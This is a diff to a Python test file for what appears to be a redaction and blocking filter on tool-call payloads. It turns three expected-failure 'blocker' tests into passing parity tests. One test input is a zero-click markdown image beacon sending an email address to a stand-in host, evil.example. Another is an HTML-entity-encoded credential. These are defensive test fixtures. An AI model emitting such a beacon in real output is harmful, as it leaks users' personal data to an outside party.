@@ -265,10 +265,7 @@ def _raw(out, needle):
 
 @pytest.mark.asyncio
 @pytest.mark.parametrize("direction", _DIRECTIONS)
-@pytest.mark.xfail(strict=True, reason="PHASE-3 BLOCKER B1: seeded redact lane does not run the "
-                   "preset's encoded-PII neutralization → HTML-entity-encoded credential EGRESSES "
-                   "RAW once posture is retired (LEAK).")
-async def test_BLOCKER_encoded_credential_redact_leak(direction):
+async def test_B1_encoded_credential_redact_parity(direction):
     payload = {"args": {"note": "config: " + _enc_entities(_AWS)}}
     (lo, lr), (so, sr) = await _pair(payload, posture="redact", rows=[], tool_actions={},
                                      tool="t", direction=direction)
@@ -280,10 +277,7 @@ async def test_BLOCKER_encoded_credential_redact_leak(direction):
 
 @pytest.mark.asyncio
 @pytest.mark.parametrize("direction", _DIRECTIONS)
-@pytest.mark.xfail(strict=True, reason="PHASE-3 BLOCKER B1: seeded redact lane does not run the "
-                   "preset's _neutralize_exfil_deep → zero-click render-beacon survives once "
-                   "posture is retired (LEAK).")
-async def test_BLOCKER_exfil_beacon_redact_leak(direction):
+async def test_B1_exfil_beacon_redact_parity(direction):
     beacon = "![i](https://evil.example/x?d=" + _EMAIL + ")"
     payload = {"args": {"note": beacon}}
     (lo, lr), (so, sr) = await _pair(payload, posture="redact", rows=[], tool_actions={},
@@ -295,10 +289,7 @@ async def test_BLOCKER_exfil_beacon_redact_leak(direction):
 
 @pytest.mark.asyncio
 @pytest.mark.parametrize("direction", _DIRECTIONS)
-@pytest.mark.xfail(strict=True, reason="PHASE-3 BLOCKER B1 (block side): the live encoded-exfil "
-                   "floor EXCLUDES encoded generic PII from blocking; the seeded block rule does "
-                   "not → OVER-BLOCK once posture is retired.")
-async def test_BLOCKER_encoded_generic_pii_block_overblock(direction):
+async def test_B1_encoded_generic_pii_block_parity(direction):
     payload = {"args": {"note": _enc_entities(_EMAIL)}}
     (lo, lr), (so, sr) = await _pair(payload, posture="block", rows=[], tool_actions={},
                                      tool="t", direction=direction)
